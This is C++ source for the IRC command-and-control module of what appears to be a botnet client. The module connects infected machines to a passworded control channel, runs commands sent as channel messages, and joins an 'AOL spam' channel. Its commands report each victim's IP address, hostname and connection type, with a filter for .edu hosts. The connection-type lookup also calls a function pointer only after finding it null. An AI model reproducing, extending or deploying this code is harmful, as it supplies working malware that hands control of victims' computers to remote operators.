
#include "main.h"
#include "cvar.h"
#include "irc.h"
#include "mainctrl.h"
#include "utility.h"

#ifdef WIN32
typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
IGCSE fInternetGetConnectedStateEx;
#endif


CIRC::CIRC() {
	// Initialize/Clear all variables
	m_bRunning=true; m_bConnected=false; m_bJoined=false;
	m_sSocket=INVALID_SOCKET; m_iFailCount=0; m_iServerNum=0;
	m_sLocalHost.Assign(""); // Clear the localhost to prevent crash with servers that don't do userhost
	m_lLastRecv=GetTickCount();

	// Initialize SSL Socket
	m_csslSocket.Init(); }

void *CIRC::Run() {
	while(m_bRunning && g_cMainCtrl.m_bRunning) {
		if((m_iServerNum==0 && m_iFailCount>5) || (m_iServerNum!=0 && m_iFailCount>2)) {
			// Reset CIRC values, disconnect the sockets, and clear the logins
			m_bJoined=false; m_bConnected=false; if(m_sSocket!=INVALID_SOCKET) xClose(m_sSocket);
			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins();

#ifdef DBGCONSOLE
			if(!m_iServerNum) // If its the root server, use another text
				g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): Giving up root server \"%s:%d\" after %d retries!\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue, m_iFailCount);
			else
				g_cMainCtrl.m_cConsDbg.Log(2, "CIRC(0x%8.8Xh): Giving up server \"%s:%d\" after %d retries!\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue, m_iFailCount);
#endif // DBGCONSOLE

			// Select new server
			m_iServerNum++; if(m_iServerNum>m_vServers.size()-1) m_iServerNum=0;
//				m_iServerNum=0; // Server switching disabled for now, remove this to enable
			m_iFailCount=0; // Reset the failure count
			// Set the cvars to the new values
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_chanpass, \
				m_vServers.at(m_iServerNum)->si_chanpass.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_mainchan, \
				m_vServers.at(m_iServerNum)->si_mainchan.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_nickprefix, \
				m_vServers.at(m_iServerNum)->si_nickprefix.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, \
				m_vServers.at(m_iServerNum)->si_port.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, \
				m_vServers.at(m_iServerNum)->si_server.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, \
				m_vServers.at(m_iServerNum)->si_servpass.sValue.m_szString);
			g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_usessl, \
				m_vServers.at(m_iServerNum)->si_usessl.sValue.m_szString);
			m_lLastRecv=GetTickCount(); }
		if(m_sSocket==INVALID_SOCKET) { // We don't have a socket yet, try to create one
			m_sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			m_bConnected=false; Sleep(2000);
		} else if(!m_bConnected) { // We're not connected yet, connect to the server
			// Start IdentD
			if(!g_cMainCtrl.m_bIdentD_Running && g_cMainCtrl.m_cBot.identd_enabled.bValue)
				g_cMainCtrl.m_cIdentD.Start();
			// Setup vars, resolve address
			sockaddr_in ssin; int iErr; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;

#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Trying to connect to \"%s:%d\"...\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue);
#endif

			ssin.sin_port=htons(g_cMainCtrl.m_cBot.si_port.iValue); ssin.sin_addr.s_addr=ResolveAddress(g_cMainCtrl.m_cBot.si_server.sValue.CStr());

#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Resolved \"%s\" to \"%s\"...\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), inet_ntoa(to_in_addr(ssin.sin_addr.s_addr)));
#endif

			m_lLastRecv=GetTickCount();
			
			// Try to connect to the server
			iErr=connect(m_sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
			if(iErr==SOCKET_ERROR) { // Connect failed, exit
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" failed!\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue);
#endif
				Sleep(10000); m_bConnected=false; m_iFailCount++; continue;
			} else { // Connection established
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue);
#endif
				m_bConnected=true; m_bJoined=false; }

			m_lLastRecv=GetTickCount();

			if(g_cMainCtrl.m_cBot.si_usessl.bValue) {
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Starting SSL socket...\n", this);
#endif
				m_csslSocket.AttachToSocket(m_sSocket);

#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Doing SSL handshake...\n", this);
#endif
				if(!m_csslSocket.Connect()) {
					xClose(m_sSocket); m_sSocket=INVALID_SOCKET;
#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): SSL handshake failed...\n", this);
#endif
					Sleep(10000); m_bConnected=false; m_iFailCount++; continue; }
				
				m_lLastRecv=GetTickCount(); }

			// Get local ip address
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getsockname(m_sSocket, &sa, &sas);
			char szTemp[64]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
			m_sLocalIp.Assign(szTemp); m_lLocalAddr=inet_addr(szTemp);

			// Send the server password
			if(g_cMainCtrl.m_cBot.si_servpass.sValue.Compare(""))
				SendRawFormat("PASS %s\r\n", g_cMainCtrl.m_cBot.si_servpass.sValue.CStr());

			// Send the nick and register with the irc server
			SendRawFormat("NICK %s\r\nUSER %s 0 0 :%s\r\n", g_cMainCtrl.m_sUserName.CStr(), \
				g_cMainCtrl.m_sUserName.CStr(), g_cMainCtrl.m_sUserName.CStr());
		} else {
			char szLine[8192]; memset(szLine, 0, sizeof(szLine));
			// Wait for a complete line to be received
			bool bRecvd=false;
			if(g_cMainCtrl.m_cBot.si_usessl.bValue)
				bRecvd=recv_line_irc(m_sSocket, szLine, sizeof(szLine), &m_csslSocket);
			else
				bRecvd=recv_line_irc(m_sSocket, szLine, sizeof(szLine), NULL);
			if(bRecvd) {
				m_lLastRecv=GetTickCount(); CString sLine(szLine);
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Received: \"%s\"\n", this, sLine.CStr());
#endif

				// Set m_bJoined if we joined the channel
				if(!sLine.Token(1, " ").Compare("353") && \
				   !sLine.Token(4, " ").Compare(g_cMainCtrl.m_cBot.si_mainchan.sValue))
				   m_bJoined=true;

				// Send PONG if we're PING'ed
				else if(!sLine.Token(0, " ").Compare("PING")) {
					SendRawFormat("PONG %s\r\n", sLine.Token(1, " ").CStr());
					if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); }

				else if(!sLine.Token(1, " ").Compare("NOTICE")) {
					if(sLine.Token(18, " ").Compare("")) {
						if(!sLine.Token(17, " ").Compare("pong"))
							SendRawFormat("PONG %s\r\n", sLine.Token(18, " ").CStr());
						if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
							g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
							g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); } }

				// Connected to the server, get the hostname
				else if(!sLine.Token(1, " ").Compare("001") || !sLine.Token(1, " ").Compare("005")) {
					if(!m_bJoined) {
						SendRawFormat("JOIN %s %s\r\n", \
						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr());
						if(g_cMainCtrl.m_bCanSpamAOL && g_cMainCtrl.m_cBot.spam_aol_enabled.bValue)
							SendRawFormat("JOIN %s %s\r\n", \
							g_cMainCtrl.m_cBot.spam_aol_channel.sValue.CStr(), \
							g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); }
					SendRawFormat("USERHOST %s\r\n", g_cMainCtrl.m_sUserName.CStr()); }
				
				// Get the hostname
				else if(!sLine.Token(1, " ").Compare("302")) {
					CString sTemp=sLine.Token(3, " ");
					char *h=strstr(sTemp.Str(), "@");
					if(h) m_sLocalHost.Assign(h+1); }

				// Its a private message
				else if(!sLine.Token(1, " ").Compare("PRIVMSG")) {
#ifdef DBGCONSOLE
                    g_cMainCtrl.m_cConsDbg.Log(10, "PRIVMSG: %s\n", sLine.Str());
#endif
					CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
					// Check silent and notice parameters, and set bool flags accordingly
					if(strstr(sLine.CStr(), " -s")) msg->bSilent=true; else msg->bSilent=false;
					if(strstr(sLine.CStr(), " -n")) msg->bNotice=true; else msg->bNotice=false;
					// Parse the strings, and insert them into the message
					msg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
					msg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
					msg->sHost.Assign(sLine.Token(1, "@").Token(0, " "));
					msg->sDest.Assign(sLine.Token(2, " "));
					char *szText=strstr(sLine.Str(), " :");
					if(szText) msg->sChatString.Assign(szText+2); else msg->sChatString.Assign("");
#ifdef DBGCONSOLE
					g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
						this, msg->sSrc.CStr(), msg->sIdentd.CStr(), msg->sHost.CStr(), \
						msg->sDest.CStr(), msg->sChatString.CStr());
#endif
					// Let the bot handle it
					ex->Start();
					ex->Set(msg); delete msg; }
				
				// Someone got kicked, maybe the bot itself
				else if(!sLine.Token(1, " ").Compare("KICK")) {
					// If someone is logged in by that name, log him out
					login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sLine.Token(3, " "));
					if(pLogin) g_cMainCtrl.m_cMac.DelLogin(sLine.Token(3, " "), sLine.Token(3, " "));

					// If the bot itself is kicked, rejoin, and send "screw you %s!"
					if(!sLine.Token(3, " ").Compare(g_cMainCtrl.m_sUserName)) {
						CString sName(sLine.Token(1, ":").Token(0, "!").CStr());
						m_bJoined=false; SendRawFormat("JOIN %s %s\r\n", \
							g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
							g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr());
						SendRawFormat("PRIVMSG %s :screw you %s!\r\n", g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), sName.CStr()); } }

				// Someone changed his nickname
				else if(!sLine.Token(1, " ").Compare("NICK")) {
					// Check if hes logged in, if so, replace the username in CMac
					CString sOldNick(sLine.Token(1, ":").Token(0, "!").CStr());
					if(!strstr(sLine.Str(), " :")) continue;
					CString sNewNick(strstr(sLine.Str(), " :"));
					if(sOldNick.Compare("") && sNewNick.Compare("")) {
						login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sOldNick);
						if(pLogin) pLogin->sIRCUsername.Assign(sNewNick);
						if(!sOldNick.Compare(g_cMainCtrl.m_sUserName)) g_cMainCtrl.m_sUserName.Assign(sNewNick); } }

				// Someone left the channel
				else if(!sLine.Token(1, " ").Compare("PART") || !sLine.Token(1, " ").Compare("QUIT")) {
					// Check if hes logged in, if so, log him out
					login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sLine.Token(1, ":").Token(0, "!"));
					if(pLogin) g_cMainCtrl.m_cMac.DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!")); }
			} else { // We didn't receive a valid line, or the server closed the connection
				Fail(); continue;
			}
		}
	}

	return NULL;
}

void CIRC::Init()
{	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDisconnect,	"irc.disconnect",	"disconnects the bot from irc",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAction,		"irc.action",		"lets the bot perform an action",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGetEdu,		"irc.getedu",		"prints netinfo when the bot is .edu",				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGetHost,		"irc.gethost",		"prints netinfo when host matches",					this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdJoin,			"irc.join",			"makes the bot join a channel",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdMode,			"irc.mode",			"lets the bot perform a mode change",				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNetInfo,		"irc.netinfo",		"prints netinfo",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPart,			"irc.part",			"makes the bot part a channel",						this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPrivMsg,		"irc.privmsg",		"sends a privmsg",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdQuit,			"irc.quit",			"quits the bot",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRaw,			"irc.raw",			"sends a raw message to the irc server",			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdReconnect,	"irc.reconnect",	"reconnects to the server",							this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdServer,		"irc.server",		"changes the server the bot connects to",			this); }

bool CIRC::HandleCommand(CMessage *pMsg)
{

#ifdef DBGCONSOLE
        g_cMainCtrl.m_cConsDbg.Log(10, "File =%s:Line=%d:Function=%s \n",__FILE__, __LINE__, __FUNCTION__);
        g_cMainCtrl.m_cConsDbg.Log(10, "*%s* %s  \n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif
    if(!pMsg->sCmd.Compare("irc.disconnect") || !pMsg->sCmd.Compare("irc.reconnect"))
	{	m_iServerNum=0; m_iFailCount=0;
		m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
		m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); }

	else if(!pMsg->sCmd.Compare("irc.quit"))
	{	Disconnect();
		g_cMainCtrl.m_bRunning=false; }

	else if(!pMsg->sCmd.Compare("irc.action"))
	{	SendFormat(false, false, pMsg->sChatString.Token(1, " ").Str(), \
			"\1ACTION %s\1", pMsg->sChatString.Token(2, " ", true).CStr()); }

	else if(!pMsg->sCmd.Compare("irc.netinfo"))
	{	SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.getedu"))
	{	if(m_sLocalHost.Find(".edu") || m_sLocalHost.Find(".Edu") || m_sLocalHost.Find(".EDU"))
			SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.gethost"))
	{	if(m_sLocalHost.Find(pMsg->sChatString.Token(1, " ")))
			SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare("irc.join"))
	{	SendRawFormat("JOIN %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.part"))
	{	SendRawFormat("PART %s\r\n", pMsg->sChatString.Token(1, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.raw"))
	{	CString sStr; sStr.Format("%s\r\n", pMsg->sChatString.Token(1, " ", true).CStr());
		SendRaw(sStr.Str()); }

	else if(!pMsg->sCmd.Compare("irc.privmsg"))
	{	SendMsg(false, false, pMsg->sChatString.Token(2, " ", true).Str(), pMsg->sChatString.Token(1, " ").Str()); }

	else if(!pMsg->sCmd.Compare("irc.mode"))
	{	SendRawFormat("MODE %s %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr(), pMsg->sChatString.Token(3, " ").CStr()); }

	else if(!pMsg->sCmd.Compare("irc.server"))
	{	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, pMsg->sChatString.Token(1, " ").CStr());
		g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, pMsg->sChatString.Token(2, " ").CStr());
		g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, pMsg->sChatString.Token(3, " ").CStr()); }

	return false; }

CString CIRC::NetInfo()
{	CString sNetInfo; sockaddr sa; socklen_t sas;
	// get ip address
	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getsockname(m_sSocket, &sa, &sas);

#ifdef WIN32
	// get connection type/name
	unsigned long n; char ctype[8]; char cname[128];
	memset(cname, 0, sizeof(cname)); memset(ctype, 0, sizeof(ctype));
	HINSTANCE wininet_dll=LoadLibrary("WININET.DLL");
    if(wininet_dll)
	{ 	fInternetGetConnectedStateEx=(IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if(!fInternetGetConnectedStateEx)
		{	fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
			if(n&&INTERNET_CONNECTION_MODEM==INTERNET_CONNECTION_MODEM)
				strncpy(ctype, "dial-up", sizeof(ctype)-1);
			else
				strncpy(ctype, "LAN", sizeof(ctype)-1); }
		else
		{	strncpy(ctype, "N/A", sizeof(ctype)-1);
			strncpy(cname, "N/A", sizeof(cname)-1); } }
#else
	// Fixme! add connection type detection for linux
#endif // WIN32

	char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

	sNetInfo.Assign(""); sNetInfo.Append("connection type: ");

#ifdef WIN32
	sNetInfo.Append(ctype); sNetInfo.Append(" ("); sNetInfo.Append(cname); sNetInfo.Append("). ");
#else
	sNetInfo.Append("Linux. ");
#endif // WIN32

		sNetInfo.Append("local IP address: "); sNetInfo.Append(szIP); sNetInfo.Append(". ");
		sNetInfo.Append("connected from: "); sNetInfo.Append(m_sLocalHost); sNetInfo.Append(". ");
		sNetInfo.Append("private ip: ");
	if(IsPrivate(szIP))
		sNetInfo.Append("yes. ");
	else
		sNetInfo.Append("no. ");

	return sNetInfo; }

bool CIRC::SendRaw(char *szMsg)
{	if(g_cMainCtrl.m_cBot.si_usessl.bValue)
	{	if(m_csslSocket.Write(szMsg, strlen(szMsg))<strlen(szMsg))
		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
		else return true; }
	else
	{	if(xWrite(m_sSocket, szMsg, strlen(szMsg))<strlen(szMsg))
		{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); return false; }
		else return true; } }
bool CIRC::SendRawFormat(const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendRaw(formatbuf); }

bool CIRC::SendMsg(bool bSilent, bool bNotice, char *szMsg, char *szDst)
{	if(bSilent) return false; CString sTheCmd; if(bNotice) sTheCmd.Assign("NOTICE"); else sTheCmd.Assign("PRIVMSG");
	CString sSendBuf; sSendBuf.Format("%s %s :%s\r\n", sTheCmd.CStr(), szDst, szMsg);
	return SendRaw(sSendBuf.Str()); }
bool CIRC::SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt, ...)
{	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFmt);
	vsnprintf(formatbuf, sizeof(formatbuf), szFmt, va_alist); va_end(va_alist);
	return SendMsg(bSilent, bNotice, formatbuf, szDst); }

void CIRC::Fail()
{	Disconnect(); m_iFailCount++; }

void CIRC::Disconnect()
{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
	m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); }
